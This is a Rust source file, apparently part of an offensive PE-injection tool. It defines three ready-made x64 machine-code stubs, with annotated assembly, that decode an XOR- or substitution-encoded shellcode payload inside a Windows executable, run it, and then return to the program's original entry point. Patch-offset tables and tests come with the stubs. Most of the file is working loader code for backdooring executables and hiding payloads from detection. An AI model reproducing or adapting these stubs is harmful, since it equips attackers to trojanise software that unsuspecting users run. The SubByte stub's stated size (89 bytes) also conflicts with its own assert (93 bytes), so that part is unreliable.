//! Pre-assembled x64 carrier stubs for PE injection
//!
//! Each stub is a position-independent x64 machine code sequence that:
//! 1. Aligns RSP (mandatory for Win64 ABI — learned from SuperMega's AlignRSP pattern)
//! 2. Decodes the encoded payload in-place
//! 3. Jumps to decoded shellcode
//! 4. Optionally returns to the original entry point (OEP) via RIP-relative delta
//!
//! Three variants match the three compatible encoding types:
//! - XOR: Rolling 2-byte XOR decode loop
//! - SubByte: Reverse nibble-mapping via 256-byte reverse lookup table
//! - None: No decode, direct trampoline to payload
//!
//! ## Section data layout
//!
//! ```text
//! [stub_code] [key_bytes] [encoded_payload]
//! ```
//!
//! Key sizes: XOR = 2 bytes, SubByte = 256 bytes (reverse LUT), None = 0 bytes.

/// Layout information for a carrier stub — describes where to patch build-time values.
#[derive(Debug, Clone, Copy)]
pub struct StubLayout {
    /// Total size of the stub code (before key/payload data).
    pub code_size: usize,
    /// Offset within stub code where payload length (u32 LE) must be written.
    /// Set to `usize::MAX` if not applicable (e.g., None stub).
    pub payload_len_patch: usize,
    /// Size of key/metadata bytes placed between stub code and encoded payload.
    pub key_size: usize,
    /// Offset within stub code where OEP return delta (i32 LE) must be written.
    /// The PeInjector patches this when `return_to_oep` is true.
    /// When false, the `lea rax + jmp rax` is replaced with NOPs.
    pub oep_patch: Option<usize>,
    /// Offset of the `lea rax, [rip + OEP_DELTA]` instruction (3 bytes before oep_patch).
    /// Used to NOP out the OEP return sequence when return_to_oep is false.
    pub oep_lea_offset: Option<usize>,
    /// Length of the OEP return sequence (lea + jmp = 9 bytes) for NOP replacement.
    pub oep_sequence_len: usize,
    /// Offset of the data-pointer LEA's disp32 operand (for future cross-section patching).
    /// All stubs have the data LEA at 0x0B with disp32 at 0x0E.
    pub data_lea_disp_offset: usize,
}

// =============================================================================
// XOR Stub — Rolling 2-byte XOR decode loop (77 bytes)
// =============================================================================
//
// Section data: [code (77)] [key (2)] [encoded_payload (N)]
//
// ```asm
// ; === RSP alignment (Win64 ABI: RSP must be 16-byte aligned before CALL) ===
// 0x00  push rsi
// 0x01  push rdi
// 0x02  push rbx
// 0x03  and  rsp, -16                ; 16-byte align
// 0x07  sub  rsp, 0x28               ; shadow space
//
// ; === Locate key + payload via RIP-relative LEA ===
// 0x0B  lea  rsi, [rip + 0x3B]       ; → XOR key (2 bytes), at code_size=0x4D
// 0x12  movzx eax, byte [rsi]        ; key[0]
// 0x15  movzx edx, byte [rsi+1]      ; key[1]
// 0x19  lea  rdi, [rsi+2]            ; → encoded payload
//
// ; === Init decode loop ===
// 0x1D  xor  ebx, ebx               ; i = 0
// 0x1F  xor  ecx, ecx
// 0x21  add  ecx, PAYLOAD_LEN        ; patched at offset 0x23
//
// ; === Decode loop ===
// 0x27  test bl, 1                   ; odd index?
// 0x2A  jz   .even (0x31)
// 0x2C  xor  byte [rdi+rbx], dl      ; payload[i] ^= key[1]
// 0x2F  jmp  .next (0x34)
// 0x31  xor  byte [rdi+rbx], al      ; payload[i] ^= key[0]
// 0x34  inc  ebx
// 0x36  cmp  ebx, ecx
// 0x38  jl   .loop (0x27)
//
// ; === Execute decoded shellcode ===
// 0x3A  call rdi
//
// ; === Optional: return to OEP (RIP-relative, ASLR-safe) ===
// 0x3C  lea  rax, [rip + OEP_DELTA]  ; patched at offset 0x3F
// 0x43  jmp  rax
//
// ; === Cleanup (reached if shellcode returns and OEP NOP'd) ===
// 0x45  add  rsp, 0x28
// 0x49  pop  rbx
// 0x4A  pop  rdi
// 0x4B  pop  rsi
// 0x4C  ret
// ```

/// XOR carrier stub layout.
pub const XOR_LAYOUT: StubLayout = StubLayout {
    code_size: XOR_STUB_CODE.len(),
    payload_len_patch: 0x23,    // offset of `add ecx, IMM32` operand
    key_size: 2,                // 2-byte XOR key
    oep_patch: Some(0x3F),      // offset of OEP_DELTA i32 operand
    oep_lea_offset: Some(0x3C), // start of `lea rax, [rip+delta]`
    oep_sequence_len: 9,        // lea(7) + jmp(2) = 9 bytes
    data_lea_disp_offset: 0x0E, // disp32 of `lea rsi, [rip+...]` at 0x0B
};

/// x64 machine code for the XOR carrier stub.
pub const XOR_STUB_CODE: &[u8] = &[
    // RSP alignment
    0x56, // 0x00  push rsi
    0x57, // 0x01  push rdi
    0x53, // 0x02  push rbx
    0x48, 0x83, 0xE4, 0xF0, // 0x03  and rsp, -16
    0x48, 0x83, 0xEC, 0x28, // 0x07  sub rsp, 0x28
    // LEA to key bytes: RIP after = 0x12, target = 0x4D, disp = 0x3B
    0x48, 0x8D, 0x35, 0x3B, 0x00, 0x00, 0x00, // 0x0B  lea rsi, [rip+0x3B]
    // Load XOR key
    0x0F, 0xB6, 0x06, // 0x12  movzx eax, byte [rsi]
    0x0F, 0xB6, 0x56, 0x01, // 0x15  movzx edx, byte [rsi+1]
    // Payload starts at key + 2
    0x48, 0x8D, 0x7E, 0x02, // 0x19  lea rdi, [rsi+2]
    // Init loop
    0x33, 0xDB, // 0x1D  xor ebx, ebx
    0x33, 0xC9, // 0x1F  xor ecx, ecx
    0x81, 0xC1, 0x00, 0x00, 0x00, 0x00, // 0x21  add ecx, PAYLOAD_LEN [patch@0x23]
    // Decode loop
    0xF6, 0xC3, 0x01, // 0x27  test bl, 1
    0x74, 0x05, // 0x2A  jz +5 (→0x31)
    0x30, 0x14, 0x1F, // 0x2C  xor byte [rdi+rbx], dl
    0xEB, 0x03, // 0x2F  jmp +3 (→0x34)
    0x30, 0x04, 0x1F, // 0x31  xor byte [rdi+rbx], al
    0xFF, 0xC3, // 0x34  inc ebx
    0x3B, 0xD9, // 0x36  cmp ebx, ecx
    0x7C, 0xED, // 0x38  jl -19 (→0x27)
    // Call decoded shellcode
    0xFF, 0xD7, // 0x3A  call rdi
    // OEP return (patched when return_to_oep=true; NOP'd when false)
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, // 0x3C  lea rax, [rip+OEP_DELTA] [patch@0x3F]
    0xFF, 0xE0, // 0x43  jmp rax
    // Cleanup (reached if OEP sequence NOP'd and shellcode returns)
    0x48, 0x83, 0xC4, 0x28, // 0x45  add rsp, 0x28
    0x5B, // 0x49  pop rbx
    0x5F, // 0x4A  pop rdi
    0x5E, // 0x4B  pop rsi
    0xC3, // 0x4C  ret
];

const _: () = assert!(XOR_STUB_CODE.len() == 0x4D); // 77 bytes

// =============================================================================
// SubByte Stub — Reverse nibble-mapping via 256-byte reverse LUT (89 bytes)
// =============================================================================
//
// Section data: [code (89)] [reverse_lut (256)] [encoded_payload (2*N)]
//
// The SubByte encoding splits each original byte into two nibbles, each mapped
// through a 16-entry forward LUT. Decoding reverses this using a 256-byte
// reverse LUT (sparse — only 16 entries are non-zero).
//
// The stub decodes in-place: for each iteration i (0..original_len), it reads
// encoded[i*2] and encoded[i*2+1], looks them up in the reverse LUT, combines
// the nibbles, and writes the result at position i. This is safe because the
// write offset i is always < read offset i*2.
//
// ```asm
// ; === RSP alignment ===
// 0x00  push rsi / push rdi / push rbx
// 0x03  and rsp, -16 / sub rsp, 0x28
//
// ; === Locate LUT + payload ===
// 0x0B  lea  rsi, [rip + 0x4B]      ; → 256-byte reverse LUT (at code_size=0x5D)
// 0x12  lea  rdi, [rsi + 0x100]     ; → encoded payload (LUT + 256)
// 0x19  xor  ecx, ecx
// 0x1B  add  ecx, PAYLOAD_LEN       ; original payload length (patched at 0x1D)
// 0x21  xor  ebx, ebx              ; i = 0
//
// ; === Decode loop ===
// 0x23  lea  rax, [rbx+rbx]        ; rax = i*2
// 0x27  movzx edx, byte [rdi+rax]  ; hi_enc = encoded[i*2]
// 0x2B  movzx edx, byte [rsi+rdx]  ; hi_nibble = reverse_lut[hi_enc]
// 0x2F  shl  edx, 4                ; hi_nibble <<= 4
// 0x32  lea  rax, [rbx+rbx]        ; rax = i*2 (reload)
// 0x36  movzx eax, byte [rdi+rax+1]; lo_enc = encoded[i*2+1]
// 0x3B  movzx eax, byte [rsi+rax]  ; lo_nibble = reverse_lut[lo_enc]
// 0x3F  or   edx, eax              ; byte = (hi << 4) | lo
// 0x41  mov  byte [rdi+rbx], dl    ; decoded[i] = byte (overwrites encoded[i*2])
// 0x44  inc  ebx
// 0x46  cmp  ebx, ecx
// 0x48  jl   .loop (0x23)
//
// ; === Execute + OEP return ===
// 0x4A  call rdi
// 0x4C  lea  rax, [rip + OEP_DELTA] ; patched at 0x4F
// 0x53  jmp  rax
// 0x55  add  rsp, 0x28 / pop rbx / pop rdi / pop rsi / ret
// ```

/// SubByte carrier stub layout.
pub const SUBBYTE_LAYOUT: StubLayout = StubLayout {
    code_size: SUBBYTE_STUB_CODE.len(),
    payload_len_patch: 0x1D,    // offset of `add ecx, IMM32` operand
    key_size: 256,              // 256-byte reverse lookup table
    oep_patch: Some(0x4F),      // offset of OEP_DELTA i32 operand
    oep_lea_offset: Some(0x4C), // start of `lea rax, [rip+delta]`
    oep_sequence_len: 9,        // lea(7) + jmp(2)
    data_lea_disp_offset: 0x0E, // disp32 of `lea rsi, [rip+...]` at 0x0B
};

/// x64 machine code for the SubByte carrier stub.
pub const SUBBYTE_STUB_CODE: &[u8] = &[
    // RSP alignment
    0x56, // 0x00  push rsi
    0x57, // 0x01  push rdi
    0x53, // 0x02  push rbx
    0x48, 0x83, 0xE4, 0xF0, // 0x03  and rsp, -16
    0x48, 0x83, 0xEC, 0x28, // 0x07  sub rsp, 0x28
    // LEA to reverse LUT: RIP after = 0x12, target = 0x5D (code_size), disp = 0x4B
    0x48, 0x8D, 0x35, 0x4B, 0x00, 0x00, 0x00, // 0x0B  lea rsi, [rip+0x4B]
    // LEA to encoded payload: rsi + 256
    0x48, 0x8D, 0xBE, 0x00, 0x01, 0x00, 0x00, // 0x12  lea rdi, [rsi+0x100]
    // Load original payload length
    0x33, 0xC9, // 0x19  xor ecx, ecx
    0x81, 0xC1, 0x00, 0x00, 0x00, 0x00, // 0x1B  add ecx, PAYLOAD_LEN [patch@0x1D]
    // Init loop counter
    0x33, 0xDB, // 0x21  xor ebx, ebx
    // Decode loop
    0x48, 0x8D, 0x04, 0x1B, // 0x23  lea rax, [rbx+rbx]  ; i*2
    0x0F, 0xB6, 0x14, 0x07, // 0x27  movzx edx, byte [rdi+rax]
    0x0F, 0xB6, 0x14, 0x16, // 0x2B  movzx edx, byte [rsi+rdx]
    0xC1, 0xE2, 0x04, // 0x2F  shl edx, 4
    0x48, 0x8D, 0x04, 0x1B, // 0x32  lea rax, [rbx+rbx]  ; i*2 (reload)
    0x0F, 0xB6, 0x44, 0x07, 0x01, // 0x36  movzx eax, byte [rdi+rax+1]
    0x0F, 0xB6, 0x04, 0x06, // 0x3B  movzx eax, byte [rsi+rax]
    0x09, 0xC2, // 0x3F  or edx, eax
    0x88, 0x14, 0x1F, // 0x41  mov byte [rdi+rbx], dl
    0xFF, 0xC3, // 0x44  inc ebx
    0x3B, 0xD9, // 0x46  cmp ebx, ecx
    0x7C, 0xD9, // 0x48  jl -39 (→0x23)
    // Call decoded shellcode
    0xFF, 0xD7, // 0x4A  call rdi
    // OEP return
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, // 0x4C  lea rax, [rip+OEP_DELTA] [patch@0x4F]
    0xFF, 0xE0, // 0x53  jmp rax
    // Cleanup
    0x48, 0x83, 0xC4, 0x28, // 0x55  add rsp, 0x28
    0x5B, // 0x59  pop rbx
    0x5F, // 0x5A  pop rdi
    0x5E, // 0x5B  pop rsi
    0xC3, // 0x5C  ret
];

const _: () = assert!(SUBBYTE_STUB_CODE.len() == 0x5D); // 93 bytes

// =============================================================================
// None Stub — Direct trampoline, no decoding (37 bytes)
// =============================================================================
//
// Section data: [code (37)] [payload (N)]
//
// ```asm
// 0x00  push rsi / push rdi / push rbx
// 0x03  and rsp, -16 / sub rsp, 0x28
// 0x0B  lea  rdi, [rip + 0x13]      ; → payload (at code_size=0x25)
// 0x12  call rdi
// 0x14  lea  rax, [rip + OEP_DELTA] ; patched at 0x17
// 0x1B  jmp  rax
// 0x1D  add  rsp, 0x28 / pop rbx / pop rdi / pop rsi / ret
// ```

/// None (no encoding) carrier stub layout.
pub const NONE_LAYOUT: StubLayout = StubLayout {
    code_size: NONE_STUB_CODE.len(),
    payload_len_patch: usize::MAX, // not used — no decode
    key_size: 0,                   // no key
    oep_patch: Some(0x17),         // offset of OEP_DELTA i32 operand
    oep_lea_offset: Some(0x14),    // start of `lea rax, [rip+delta]`
    oep_sequence_len: 9,           // lea(7) + jmp(2)
    data_lea_disp_offset: 0x0E,    // disp32 of `lea rdi, [rip+...]` at 0x0B
};

/// x64 machine code for the None carrier stub (no decoding).
pub const NONE_STUB_CODE: &[u8] = &[
    // RSP alignment
    0x56, // 0x00  push rsi
    0x57, // 0x01  push rdi
    0x53, // 0x02  push rbx
    0x48, 0x83, 0xE4, 0xF0, // 0x03  and rsp, -16
    0x48, 0x83, 0xEC, 0x28, // 0x07  sub rsp, 0x28
    // LEA to payload: RIP after = 0x12, target = 0x25 (code_size), disp = 0x13
    0x48, 0x8D, 0x3D, 0x13, 0x00, 0x00, 0x00, // 0x0B  lea rdi, [rip+0x13]
    // Call payload directly
    0xFF, 0xD7, // 0x12  call rdi
    // OEP return
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, // 0x14  lea rax, [rip+OEP_DELTA] [patch@0x17]
    0xFF, 0xE0, // 0x1B  jmp rax
    // Cleanup
    0x48, 0x83, 0xC4, 0x28, // 0x1D  add rsp, 0x28
    0x5B, // 0x21  pop rbx
    0x5F, // 0x22  pop rdi
    0x5E, // 0x23  pop rsi
    0xC3, // 0x24  ret
];

const _: () = assert!(NONE_STUB_CODE.len() == 0x25); // 37 bytes

// =============================================================================
// Helper: build SubByte reverse lookup table
// =============================================================================

/// Build a 256-byte reverse lookup table from a 16-entry forward SubByte mapping.
///
/// Forward: `forward[nibble_value] = encoded_byte`
/// Reverse: `reverse[encoded_byte] = nibble_value`
///
/// Unused entries in the reverse table are 0 (same as nibble 0, but this is only
/// reached for invalid encoded bytes which should never appear in well-formed data).
pub fn build_subbyte_reverse_lut(forward: &[u8; 16]) -> [u8; 256] {
    let mut reverse = [0u8; 256];
    for (nibble, &encoded) in forward.iter().enumerate() {
        reverse[encoded as usize] = nibble as u8;
    }
    reverse
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_stub_starts_with_push_rsi() {
        assert_eq!(XOR_STUB_CODE[0], 0x56, "XOR stub must start with push rsi");
    }

    #[test]
    fn test_xor_stub_has_rsp_alignment() {
        // and rsp, -16 = 48 83 E4 F0
        assert_eq!(&XOR_STUB_CODE[3..7], &[0x48, 0x83, 0xE4, 0xF0]);
    }

    #[test]
    fn test_none_stub_has_rsp_alignment() {
        assert_eq!(&NONE_STUB_CODE[3..7], &[0x48, 0x83, 0xE4, 0xF0]);
    }

    #[test]
    fn test_subbyte_stub_has_rsp_alignment() {
        assert_eq!(&SUBBYTE_STUB_CODE[3..7], &[0x48, 0x83, 0xE4, 0xF0]);
    }

    #[test]
    fn test_xor_layout_patch_offsets_within_bounds() {
        assert!(XOR_LAYOUT.payload_len_patch < XOR_STUB_CODE.len());
        assert!(XOR_LAYOUT.oep_patch.unwrap() < XOR_STUB_CODE.len());
        assert!(XOR_LAYOUT.oep_lea_offset.unwrap() < XOR_STUB_CODE.len());
    }

    #[test]
    fn test_subbyte_layout_patch_offsets_within_bounds() {
        assert!(SUBBYTE_LAYOUT.payload_len_patch < SUBBYTE_STUB_CODE.len());
        assert!(SUBBYTE_LAYOUT.oep_patch.unwrap() < SUBBYTE_STUB_CODE.len());
    }

    #[test]
    fn test_none_layout_no_payload_len_patch() {
        assert_eq!(NONE_LAYOUT.payload_len_patch, usize::MAX);
    }

    #[test]
    fn test_all_stubs_end_with_ret() {
        assert_eq!(XOR_STUB_CODE.last(), Some(&0xC3));
        assert_eq!(NONE_STUB_CODE.last(), Some(&0xC3));
        assert_eq!(SUBBYTE_STUB_CODE.last(), Some(&0xC3));
    }

    #[test]
    fn test_xor_stub_valid_x64() {
        use iced_x86::{Decoder, DecoderOptions};
        let mut decoder = Decoder::with_ip(64, XOR_STUB_CODE, 0x1000, DecoderOptions::NONE);
        let mut total_bytes = 0usize;
        while decoder.can_decode() {
            let instr = decoder.decode();
            assert!(
                !instr.is_invalid(),
                "Invalid x64 instruction at offset {:#x} in XOR stub",
                total_bytes
            );
            total_bytes += instr.len();
        }
        assert_eq!(
            total_bytes,
            XOR_STUB_CODE.len(),
            "Decoded bytes must match XOR stub size"
        );
    }

    #[test]
    fn test_none_stub_valid_x64() {
        use iced_x86::{Decoder, DecoderOptions};
        let mut decoder = Decoder::with_ip(64, NONE_STUB_CODE, 0x1000, DecoderOptions::NONE);
        let mut total_bytes = 0usize;
        while decoder.can_decode() {
            let instr = decoder.decode();
            assert!(
                !instr.is_invalid(),
                "Invalid x64 instruction at offset {:#x} in None stub",
                total_bytes
            );
            total_bytes += instr.len();
        }
        assert_eq!(total_bytes, NONE_STUB_CODE.len());
    }

    #[test]
    fn test_subbyte_stub_valid_x64() {
        use iced_x86::{Decoder, DecoderOptions};
        let mut decoder = Decoder::with_ip(64, SUBBYTE_STUB_CODE, 0x1000, DecoderOptions::NONE);
        let mut total_bytes = 0usize;
        while decoder.can_decode() {
            let instr = decoder.decode();
            assert!(
                !instr.is_invalid(),
                "Invalid x64 instruction at offset {:#x} in SubByte stub",
                total_bytes
            );
            total_bytes += instr.len();
        }
        assert_eq!(total_bytes, SUBBYTE_STUB_CODE.len());
    }

    #[test]
    fn test_subbyte_reverse_lut_roundtrip() {
        let forward: [u8; 16] = [0, 2, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 20];
        let reverse = build_subbyte_reverse_lut(&forward);

        // Every forward mapping should reverse correctly
        for (nibble, &encoded) in forward.iter().enumerate() {
            assert_eq!(
                reverse[encoded as usize], nibble as u8,
                "reverse[{}] should be {} but got {}",
                encoded, nibble, reverse[encoded as usize]
            );
        }
    }

    #[test]
    fn test_xor_stub_lea_displacement() {
        // LEA rsi, [rip+disp32] at offset 0x0B
        // disp32 is at bytes 0x0E..0x12
        let disp = u32::from_le_bytes(XOR_STUB_CODE[0x0E..0x12].try_into().unwrap());
        let rip_after_lea = 0x12u32;
        let expected_target = XOR_STUB_CODE.len() as u32; // key data at code_size
        assert_eq!(
            rip_after_lea + disp,
            expected_target,
            "XOR LEA displacement should point to key data at code_size"
        );
    }

    #[test]
    fn test_none_stub_lea_displacement() {
        // LEA rdi, [rip+disp32] at offset 0x0B
        let disp = u32::from_le_bytes(NONE_STUB_CODE[0x0E..0x12].try_into().unwrap());
        let rip_after_lea = 0x12u32;
        let expected_target = NONE_STUB_CODE.len() as u32;
        assert_eq!(
            rip_after_lea + disp,
            expected_target,
            "None LEA displacement should point to payload at code_size"
        );
    }

    #[test]
    fn test_subbyte_stub_lea_displacement() {
        // LEA rsi, [rip+disp32] at offset 0x0B
        let disp = u32::from_le_bytes(SUBBYTE_STUB_CODE[0x0E..0x12].try_into().unwrap());
        let rip_after_lea = 0x12u32;
        let expected_target = SUBBYTE_STUB_CODE.len() as u32;
        assert_eq!(
            rip_after_lea + disp,
            expected_target,
            "SubByte LEA displacement should point to reverse LUT at code_size"
        );
    }
}
